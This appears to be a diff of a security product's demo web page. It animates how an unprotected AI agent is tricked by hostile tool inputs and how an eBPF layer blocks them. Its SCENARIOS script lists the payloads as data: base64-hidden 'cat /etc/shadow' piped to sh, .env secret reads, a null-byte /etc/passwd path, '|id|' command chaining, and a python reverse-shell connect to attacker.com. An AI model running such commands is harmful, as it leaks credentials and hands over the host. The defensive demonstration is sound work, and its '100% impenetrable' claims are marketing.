-                <div class="text-xs text-slate-400 mt-0.5" id="prot-desc-2">Unmasks hidden tokens and evaluates against security policies.</div>
+            <!-- Down Arrow -->
+            <div class="flex justify-center -my-1 text-emerald-500/50">
+              <i data-lucide="arrow-down" class="w-4 h-4 animate-bounce"></i>
+            </div>
+
+            <!-- Step Node 2: Deobfuscator & Semantic Engine -->
+            <div id="prot-node-2" class="flex items-center space-x-3 p-2.5 rounded-xl bg-white/5 border border-white/5 transition-all">
+              <div class="w-9 h-9 rounded-xl bg-brand-amber/20 border border-brand-amber/40 flex items-center justify-center flex-shrink-0 text-brand-amber">
+                <i data-lucide="shield-check" class="w-4 h-4"></i>
+              </div>
+              <div class="flex-1 min-w-0">
+                <div class="flex items-center justify-between">
+                  <span class="text-xs font-bold text-white">2. Unmasked & Analyzed</span>
+                  <span class="text-[10px] font-mono text-brand-amber font-bold">FLAGGED MALICIOUS</span>
+                </div>
+                <div class="text-[11px] text-slate-400 font-mono truncate" id="prot-text-2">Hidden intent decoded instantly</div>
               </div>
             </div>
 
-            <!-- Step 3 -->
-            <div id="prot-step-3" class="subcard p-3 flex items-start space-x-3 border-emerald-500/20 bg-emerald-950/20 transition-opacity">
-              <div class="w-6 h-6 rounded-md bg-emerald-500/20 text-emerald-400 flex items-center justify-center text-xs font-bold flex-shrink-0 mt-0.5">3</div>
-              <div>
-                <div class="text-xs font-semibold text-emerald-400">Pre-execution Drop</div>
-                <div class="text-xs text-slate-300 mt-0.5">Socket terminated via HTTP 403 Forbidden before reaching host kernel.</div>
+            <!-- Down Arrow -->
+            <div class="flex justify-center -my-1 text-emerald-500/50">
+              <i data-lucide="arrow-down" class="w-4 h-4 animate-bounce"></i>
+            </div>
+
+            <!-- Step Node 3: Kernel Wire Cut Drop -->
+            <div id="prot-node-3" class="flex items-center space-x-3 p-2.5 rounded-xl bg-brand-emerald/15 border border-brand-emerald/40 transition-all">
+              <div class="w-9 h-9 rounded-xl bg-brand-emerald/30 border border-brand-emerald/50 flex items-center justify-center flex-shrink-0 text-brand-emerald">
+                <i data-lucide="shield-alert" class="w-4 h-4"></i>
+              </div>
+              <div class="flex-1 min-w-0">
+                <div class="flex items-center justify-between">
+                  <span class="text-xs font-bold text-brand-emerald">3. Wire Drop (HTTP 403)</span>
+                  <span class="text-[10px] font-mono text-brand-emerald font-black">NEUTRALIZED</span>
+                </div>
+                <div class="text-[11px] text-slate-300 font-mono truncate">Socket dropped before host execution</div>
               </div>
             </div>
+
           </div>
         </div>
 
-        <!-- Metric Badges -->
+        <!-- Large Visual Impact Scorecards -->
         <div class="grid grid-cols-2 gap-3 pt-2">
-          <div class="subcard p-3 text-center">
-            <div class="text-xs text-slate-400">Host Security</div>
-            <div id="metric-prot-status" class="text-sm font-bold text-emerald-400 mt-1">0% (Intact)</div>
+          
+          <!-- Impact Metric 1 -->
+          <div class="p-4 rounded-xl bg-black/60 border border-brand-emerald/30 text-center space-y-1">
+            <div class="text-[10px] font-mono text-slate-400 uppercase font-semibold">Host Security Status</div>
+            <div id="metric-prot-breach" class="text-xl font-black text-brand-emerald flex items-center justify-center space-x-1.5">
+              <i data-lucide="lock" class="w-5 h-5"></i>
+              <span>0% BREACH</span>
+            </div>
+            <div class="text-[10px] font-mono text-slate-500">Host 100% impenetrable</div>
           </div>
-          <div class="subcard p-3 text-center">
-            <div class="text-xs text-slate-400">Data Leaked</div>
-            <div id="metric-prot-leak" class="text-sm font-bold text-emerald-400 mt-1">0 bytes</div>
+
+          <!-- Impact Metric 2 -->
+          <div class="p-4 rounded-xl bg-black/60 border border-brand-emerald/30 text-center space-y-1">
+            <div class="text-[10px] font-mono text-slate-400 uppercase font-semibold">Sensitive Data Leaked</div>
+            <div id="metric-prot-leak" class="text-xl font-black text-brand-emerald flex items-center justify-center space-x-1.5">
+              <i data-lucide="shield" class="w-5 h-5"></i>
+              <span>0 BYTES</span>
+            </div>
+            <div class="text-[10px] font-mono text-slate-500">Clean zero-compromise</div>
           </div>
+
         </div>
 
-        <!-- Outcome Banner -->
-        <div class="p-3 rounded-lg bg-emerald-500/10 border border-emerald-500/20 text-center text-xs font-medium text-emerald-400 flex items-center justify-center space-x-2">
+        <!-- Big Visual Result Stamp -->
+        <div id="stamp-protected" class="p-3.5 rounded-xl bg-brand-emerald/20 border-2 border-brand-emerald text-center font-mono font-black text-xs text-brand-emerald tracking-wider flex items-center justify-center space-x-2">
           <i data-lucide="check-circle-2" class="w-4 h-4"></i>
-          <span id="banner-protected">Protected: Blocked at kernel boundary (&lt;3.2ms)</span>
+          <span id="stamp-protected-text">RESULT: INTERCEPTED & NEUTRALIZED (&lt;3.2ms)</span>
         </div>
 
       </div>
@@ -302,185 +493,281 @@
     </div>
 
     <!-- ===================================================================== -->
-    <!-- 4. COMPARISON MATRIX TABLE                                            -->
+    <!-- 4. AT-A-GLANCE VISUAL ARCHITECTURE COMPARISON CARDS                   -->
     <!-- ===================================================================== -->
-    <div class="card p-6 space-y-4">
-      <div class="flex items-center justify-between border-b border-slate-800 pb-3">
-        <h3 class="text-sm font-bold text-white flex items-center space-x-2">
-          <i data-lucide="layers" class="w-4 h-4 text-emerald-400"></i>
-          <span>Feature & Security Comparison</span>
+    <div class="clean-box p-6 space-y-5">
+      <div class="flex items-center justify-between border-b border-white/10 pb-3">
+        <h3 class="text-base font-bold text-white flex items-center space-x-2">
+          <i data-lucide="layers" class="w-4 h-4 text-brand-purple"></i>
+          <span>Core Defense Capabilities at a Glance</span>
         </h3>
-        <span class="text-xs text-slate-500">Summary</span>
+        <span class="text-xs font-mono text-slate-500 hidden sm:inline">Visual Architecture Spec</span>
       </div>
 
-      <div class="overflow-x-auto">
-        <table class="w-full text-left text-xs">
-          <thead>
-            <tr class="border-b border-slate-800 text-slate-400">
-              <th class="py-2.5 font-semibold">Capability</th>
-              <th class="py-2.5 font-semibold text-red-400">Without TrueIntent</th>
-              <th class="py-2.5 font-semibold text-emerald-400">With TrueIntent eBPF</th>
-            </tr>
-          </thead>
-          <tbody class="divide-y divide-slate-800/60 text-slate-300">
-            <tr>
-              <td class="py-3 font-medium text-white">Evasion Unmasking (Base64 / Hex)</td>
-              <td class="text-red-400">Blind (Executes raw encoded command)</td>
-              <td class="text-emerald-400 font-medium">Decoded & normalized in &lt;1.1ms</td>
-            </tr>
-            <tr>
-              <td class="py-3 font-medium text-white">TLS Encrypted Visibility</td>
-              <td class="text-red-400">Opaque (Zero inspection over HTTPS)</td>
-              <td class="text-emerald-400 font-medium">Memory tap at <span class="font-mono">SSL_write</span></td>
-            </tr>
-            <tr>
-              <td class="py-3 font-medium text-white">Mitigation Method</td>
-              <td class="text-red-400">None (Relies on post-incident logs)</td>
-              <td class="text-emerald-400 font-medium">Pre-execution HTTP 403 / TCP RST wire drop</td>
-            </tr>
-            <tr>
-              <td class="py-3 font-medium text-white">Response Latency</td>
-              <td class="text-slate-400">Manual forensics (Hours/Days)</td>
-              <td class="text-emerald-400 font-medium">Real-time prevention (&lt;3.2ms)</td>
-            </tr>
-          </tbody>
-        </table>
+      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+        
+        <!-- Card 1: Evasion Deobfuscation -->
+        <div class="p-4 rounded-2xl bg-black/40 border border-white/10 space-y-3">
+          <div class="flex items-center space-x-2 text-brand-purple">
+            <i data-lucide="binary" class="w-4 h-4"></i>
+            <span class="text-xs font-bold font-mono uppercase">Evasion Decoding</span>
+          </div>
+          <div class="space-y-2 text-xs">
+            <div class="flex items-center justify-between p-2 rounded-lg bg-brand-crimson/10 border border-brand-crimson/20 text-slate-300">
+              <span>Unprotected:</span>
+              <span class="font-bold text-brand-crimson flex items-center space-x-1">
+                <i data-lucide="x" class="w-3.5 h-3.5"></i>
+                <span>Blind</span>
+              </span>
+            </div>
+            <div class="flex items-center justify-between p-2 rounded-lg bg-brand-emerald/10 border border-brand-emerald/20 text-slate-300">
+              <span>TrueIntent:</span>
+              <span class="font-bold text-brand-emerald flex items-center space-x-1">
+                <i data-lucide="check" class="w-3.5 h-3.5"></i>
+                <span>100% Unmasked</span>
+              </span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Card 2: TLS Visibility -->
+        <div class="p-4 rounded-2xl bg-black/40 border border-white/10 space-y-3">
+          <div class="flex items-center space-x-2 text-brand-blue">
+            <i data-lucide="eye" class="w-4 h-4"></i>
+            <span class="text-xs font-bold font-mono uppercase">Encrypted TLS Wire</span>
+          </div>
+          <div class="space-y-2 text-xs">
+            <div class="flex items-center justify-between p-2 rounded-lg bg-brand-crimson/10 border border-brand-crimson/20 text-slate-300">
+              <span>Unprotected:</span>
+              <span class="font-bold text-brand-crimson flex items-center space-x-1">
+                <i data-lucide="x" class="w-3.5 h-3.5"></i>
+                <span>Opaque HTTPS</span>
+              </span>
+            </div>
+            <div class="flex items-center justify-between p-2 rounded-lg bg-brand-emerald/10 border border-brand-emerald/20 text-slate-300">
+              <span>TrueIntent:</span>
+              <span class="font-bold text-brand-emerald flex items-center space-x-1">
+                <i data-lucide="check" class="w-3.5 h-3.5"></i>
+                <span>SSL_write Tap</span>
+              </span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Card 3: Out-of-Band Breaker -->
+        <div class="p-4 rounded-2xl bg-black/40 border border-white/10 space-y-3">
+          <div class="flex items-center space-x-2 text-brand-amber">
+            <i data-lucide="zap-off" class="w-4 h-4"></i>
+            <span class="text-xs font-bold font-mono uppercase">Action on Attack</span>
+          </div>
+          <div class="space-y-2 text-xs">
+            <div class="flex items-center justify-between p-2 rounded-lg bg-brand-crimson/10 border border-brand-crimson/20 text-slate-300">
+              <span>Unprotected:</span>
+              <span class="font-bold text-brand-crimson flex items-center space-x-1">
+                <i data-lucide="x" class="w-3.5 h-3.5"></i>
+                <span>Subshell Runs</span>
+              </span>
+            </div>
+            <div class="flex items-center justify-between p-2 rounded-lg bg-brand-emerald/10 border border-brand-emerald/20 text-slate-300">
+              <span>TrueIntent:</span>
+              <span class="font-bold text-brand-emerald flex items-center space-x-1">
+                <i data-lucide="check" class="w-3.5 h-3.5"></i>
+                <span>TCP RST Drop</span>
+              </span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Card 4: Inspection Latency -->
+        <div class="p-4 rounded-2xl bg-black/40 border border-white/10 space-y-3">
+          <div class="flex items-center space-x-2 text-brand-emerald">
+            <i data-lucide="timer" class="w-4 h-4"></i>
+            <span class="text-xs font-bold font-mono uppercase">Defense Overhead</span>
+          </div>
+          <div class="space-y-2 text-xs">
+            <div class="flex items-center justify-between p-2 rounded-lg bg-brand-crimson/10 border border-brand-crimson/20 text-slate-300">
+              <span>Unprotected:</span>
+              <span class="font-bold text-slate-400">Post-Mortem Logs</span>
+            </div>
+            <div class="flex items-center justify-between p-2 rounded-lg bg-brand-emerald/10 border border-brand-emerald/20 text-slate-300">
+              <span>TrueIntent:</span>
+              <span class="font-bold text-brand-emerald flex items-center space-x-1">
+                <i data-lucide="zap" class="w-3.5 h-3.5"></i>
+                <span>&lt; 3.2ms Wire Cut</span>
+              </span>
+            </div>
+          </div>
+        </div>
+
       </div>
     </div>
 
   </main>
 
   <!-- ===================================================================== -->
-  <!-- 5. JAVASCRIPT CONTROLLER                                              -->
+  <!-- 5. INTERACTIVE JAVASCRIPT ANIMATIONS & DYNAMICS                       -->
   <!-- ===================================================================== -->
   <script>
     lucide.createIcons();
 
-    let activeScenario = 'base64';
+    let activeScenarioId = 'base64';
 
     const SCENARIOS = {
       base64: {
         payload: "echo Y2F0IC9ldGMvc2hhZG93 | base64 -d | sh",
-        unprotDesc1: "LLM deceived by Base64 encoding.",
-        unprotDesc3: "Linux root authentication hashes exfiltrated.",
-        unprotStatus: "100% Breached",
-        unprotLeak: "4,096 bytes",
-        unprotBanner: "Critical: Root authentication hashes leaked to attacker",
-        protDesc2: "Decoded: 'cat /etc/shadow' from Base64 string.",
-        protStatus: "0% (Intact)",
-        protLeak: "0 bytes",
-        protBanner: "Protected: Malicious command dropped before execution (<3.2ms)"
+        unprotStep1: "Encoded 'cat /etc/shadow' in Base64",
+        unprotStep3: "Root auth hashes exfiltrated to attacker",
+        unprotBreach: "100% BREACH",
+        unprotBytes: "4,096 BYTES",
+        unprotStamp: "RESULT: CRITICAL LINUX ROOT HASHES LEAKED",
+        protStep2: "Decoded: 'cat /etc/shadow' from Base64",
+        protBreach: "0% BREACH",
+        protBytes: "0 BYTES",
+        protStamp: "RESULT: BLOCKED IN MEMORY // 0 BYTES LEAKED"
       },
       env: {
         payload: "read_file path='env/.env'",
-        unprotDesc1: "Prompt asks to inspect environment files.",
-        unprotDesc3: "GROK_API_KEY and AWS credentials exfiltrated.",
-        unprotStatus: "100% Breached",
-        unprotLeak: "2,048 bytes",
-        unprotBanner: "Critical: Production API keys leaked",
-        protDesc2: "Path check: Blocked access to restricted pattern '.env'.",
-        protStatus: "0% (Intact)",
-        protLeak: "0 bytes",
-        protBanner: "Protected: Sensitive file access denied by security policy"
+        unprotStep1: "Direct path reading API secret file",
+        unprotStep3: "GROK_API_KEY & AWS secrets dumped",
+        unprotBreach: "100% BREACH",
+        unprotBytes: "2,048 BYTES",
+        unprotStamp: "RESULT: PRODUCTION API KEYS COMPROMISED",
+        protStep2: "Blocked: Path matches forbidden pattern '.env'",
+        protBreach: "0% BREACH",
+        protBytes: "0 BYTES",
+        protStamp: "RESULT: TOOL EXECUTION DENIED // SECRETS SAFE"
       },
       nullbyte: {
         payload: "read_file path='/etc/passwd%00.png'",
-        unprotDesc1: "Attacker disguises file path with null byte %00.",
-        unprotDesc3: "Kernel string truncated at %00, reading /etc/passwd.",
-        unprotStatus: "100% Breached",
-        unprotLeak: "3,120 bytes",
-        unprotBanner: "Critical: Arbitrary file read achieved",
-        protDesc2: "Unmasked: Null byte stripped and normalized to '/etc/passwd'.",
-        protStatus: "0% (Intact)",
-        protLeak: "0 bytes",
-        protBanner: "Protected: Null byte traversal neutralized by kernel policy"
+        unprotStep1: "Null byte %00 path traversal disguise",
+        unprotStep3: "Kernel C library truncated at %00 -> read /etc/passwd",
+        unprotBreach: "100% BREACH",
+        unprotBytes: "3,120 BYTES",
+        unprotStamp: "RESULT: ARBITRARY SYSTEM FILE READ",
+        protStep2: "Unmasked: Null byte stripped -> normalized '/etc/passwd'",
+        protBreach: "0% BREACH",
+        protBytes: "0 BYTES",
+        protStamp: "RESULT: TRAVERSAL BLOCKED BY eBPF GATE"
       },
       chaining: {
         payload: "execute_command cmd='/index.html|id|'",
-        unprotDesc1: "Attacker injects shell pipe delimiter '|id|'.",
-        unprotDesc3: "Shell executes 'id' with full host root permissions.",
-        unprotStatus: "100% Breached",
-        unprotLeak: "1,540 bytes",
-        unprotBanner: "Critical: Injected shell command executed",
-        protDesc2: "Token parser: Detected subshell execution delimiter '|id|'.",
-        protStatus: "0% (Intact)",
-        protLeak: "0 bytes",
-        protBanner: "Protected: Chained subshell blocked before execution"
+        unprotStep1: "Subshell delimiter injection probe",
+        unprotStep3: "Shell executed 'id' with full root permissions",
+        unprotBreach: "100% BREACH",
+        unprotBytes: "1,540 BYTES",
+        unprotStamp: "RESULT: ROOT COMMAND EXECUTION ACHIEVED",
+        protStep2: "Flagged: Command chaining token '|id|' detected",
+        protBreach: "0% BREACH",
+        protBytes: "0 BYTES",
+        protStamp: "RESULT: COMMAND CHAIN DROPPED BEFORE EXEC"
       },
       reverse: {
         payload: "python3 -c 'import socket; s.connect((\"attacker.com\", 8080))'",
-        unprotDesc1: "Attacker requests network diagnostic script.",
-        unprotDesc3: "Outbound socket connection established to C2 server.",
-        unprotStatus: "100% Breached",
-        unprotLeak: "Remote Shell",
-        unprotBanner: "Catastrophic: Remote reverse shell established",
-        protDesc2: "Threat engine: Flagged unauthorized reverse socket connection.",
-        protStatus: "0% (Intact)",
-        protLeak: "0 bytes",
-        protBanner: "Protected: Connection terminated via TCP RST wire drop"
+        unprotStep1: "Outbound socket reverse shell command",
+        unprotStep3: "Interactive remote bash shell attached to C2",
+        unprotBreach: "100% BREACH",
+        unprotBytes: "FULL CONTROL",
+        unprotStamp: "RESULT: CATASTROPHIC REMOTE HOST TAKEOVER",
+        protStep2: "Flagged: Reverse TCP socket spawn signature",
+        protBreach: "0% BREACH",
+        protBytes: "0 BYTES",
+        protStamp: "RESULT: SOCKET TERMINATED VIA TCP RST"
       }
     };
 
     function selectScenario(id) {
-      activeScenario = id;
+      activeScenarioId = id;
 
-      // Update Tab Styles
-      const tabIds = ['base64', 'env', 'nullbyte', 'chaining', 'reverse'];
-      tabIds.forEach(tabId => {
-        const btn = document.getElementById(`tab-${tabId}`);
-        if (tabId === id) {
-          btn.className = "px-3.5 py-2 rounded-lg text-xs font-medium bg-emerald-500/10 text-emerald-300 border border-emerald-500/30 transition-colors cursor-pointer flex items-center space-x-1.5";
-        } else {
-          btn.className = "px-3.5 py-2 rounded-lg text-xs font-medium bg-slate-800/60 text-slate-400 border border-slate-700/60 hover:text-white hover:bg-slate-800 transition-colors cursor-pointer flex items-center space-x-1.5";
-        }
+      // Update button styling
+      document.querySelectorAll('.scen-card').forEach(card => {
+        card.className = "scen-card p-3.5 rounded-xl bg-white/5 border border-white/10 text-left transition-all cursor-pointer group hover:scale-[1.02] hover:border-white/20 relative";
       });
+      const activeCard = document.getElementById(`btn-card-${id}`);
+      if (activeCard) {
+        activeCard.className = "scen-card p-3.5 rounded-xl bg-brand-purple/15 border-2 border-brand-purple text-left transition-all cursor-pointer group hover:scale-[1.02] relative";
+      }
 
-      // Update text
-      document.getElementById('active-payload-display').textContent = SCENARIOS[id].payload;
-      updateScenarioDetails(id);
+      // Update payload text
+      document.getElementById('active-payload-text').textContent = SCENARIOS[id].payload;
+
+      // Reset dynamic values
+      updateScenarioViews(id);
     }
 
-    function updateScenarioDetails(id) {
+    function updateScenarioViews(id) {
       const data = SCENARIOS[id];
-      document.getElementById('unprot-desc-1').textContent = data.unprotDesc1;
-      document.getElementById('unprot-desc-3').textContent = data.unprotDesc3;
-      document.getElementById('metric-unprot-status').textContent = data.unprotStatus;
-      document.getElementById('metric-unprot-leak').textContent = data.unprotLeak;
-      document.getElementById('banner-unprotected').textContent = data.unprotBanner;
+      document.getElementById('unprot-text-1').textContent = data.unprotStep1;
+      document.getElementById('unprot-text-3').textContent = data.unprotStep3;
+      document.getElementById('metric-unprot-breach').querySelector('span').textContent = data.unprotBreach;
+      document.getElementById('metric-unprot-leak').querySelector('span').textContent = data.unprotBytes;
+      document.getElementById('stamp-unprotected-text').textContent = data.unprotStamp;
 
-      document.getElementById('prot-desc-2').textContent = data.protDesc2;
-      document.getElementById('metric-prot-status').textContent = data.protStatus;
-      document.getElementById('metric-prot-leak').textContent = data.protLeak;
-      document.getElementById('banner-protected').textContent = data.protBanner;
+      document.getElementById('prot-text-2').textContent = data.protStep2;
+      document.getElementById('metric-prot-breach').querySelector('span').textContent = data.protBreach;
+      document.getElementById('metric-prot-leak').querySelector('span').textContent = data.protBytes;
+      document.getElementById('stamp-protected-text').textContent = data.protStamp;
     }
 
-    function runSimulation() {
-      const btn = document.getElementById('btn-run');
+    function triggerVisualSimulation() {
+      const btn = document.getElementById('btn-simulate');
       btn.disabled = true;
-      btn.innerHTML = `<i data-lucide="loader-2" class="w-3.5 h-3.5 animate-spin"></i><span>Simulating...</span>`;
+      btn.innerHTML = `<i data-lucide="loader-2" class="w-4 h-4 animate-spin"></i><span>Simulating Trajectory...</span>`;
       lucide.createIcons();
 
-      const unprotSteps = ['unprot-step-1', 'unprot-step-2', 'unprot-step-3'];
-      const protSteps = ['prot-step-1', 'prot-step-2', 'prot-step-3'];
+      const unprotNodes = ['unprot-node-1', 'unprot-node-2', 'unprot-node-3'];
+      const protNodes = ['prot-node-1', 'prot-node-2', 'prot-node-3'];
 
-      // Reset opacity
-      unprotSteps.forEach(id => document.getElementById(id).style.opacity = '0.35');
-      protSteps.forEach(id => document.getElementById(id).style.opacity = '0.35');
+      // Reset styles
+      unprotNodes.forEach(id => {
+        const el = document.getElementById(id);
+        el.style.transform = 'scale(1)';
+        el.style.opacity = '0.5';
+      });
+      protNodes.forEach(id => {
+        const el = document.getElementById(id);
+        el.style.transform = 'scale(1)';
+        el.style.opacity = '0.5';
+      });
 
+      // Sequential animated progression using GSAP
       const tl = gsap.timeline({
         onComplete: () => {
           btn.disabled = false;
-          btn.innerHTML = `<i data-lucide="play" class="w-3.5 h-3.5 fill-current"></i><span>Simulate Attack</span>`;
+          btn.innerHTML = `<i data-lucide="rotate-ccw" class="w-4 h-4"></i><span>Run Again</span>`;
           lucide.createIcons();
+          
+          // Flash the final stamps
+          gsap.fromTo('#stamp-unprotected', { scale: 0.95 }, { scale: 1, duration: 0.3, ease: 'bounce.out' });
+          gsap.fromTo('#stamp-protected', { scale: 0.95 }, { scale: 1, duration: 0.3, ease: 'bounce.out' });
         }
       });
 
-      tl.to(['#unprot-step-1', '#prot-step-1'], { opacity: 1, duration: 0.35, ease: 'power2.out' })
-        .to(['#unprot-step-2', '#prot-step-2'], { opacity: 1, duration: 0.35, ease: 'power2.out' }, "+=0.2")
-        .to(['#unprot-step-3', '#prot-step-3'], { opacity: 1, duration: 0.35, ease: 'power2.out' }, "+=0.2");
+      // Step 1: Input arrival
+      tl.to(['#unprot-node-1', '#prot-node-1'], {
+        opacity: 1,
+        scale: 1.03,
+        duration: 0.4,
+        ease: 'power2.out'
+      });
+
+      // Step 2: Agent processing vs eBPF tap
+      tl.to(['#unprot-node-2', '#prot-node-2'], {
+        opacity: 1,
+        scale: 1.03,
+        duration: 0.5,
+        ease: 'power2.out'
+      }, "+=0.3");
+
+      // Step 3: Breach vs Shield Drop
+      tl.to(['#unprot-node-3', '#prot-node-3'], {
+        opacity: 1,
+        scale: 1.04,
+        duration: 0.5,
+        ease: 'power2.out'
+      }, "+=0.3");
     }
 
-    // Default scenario
+    // Initialize on load
     selectScenario('base64');
   </script>
 </body>
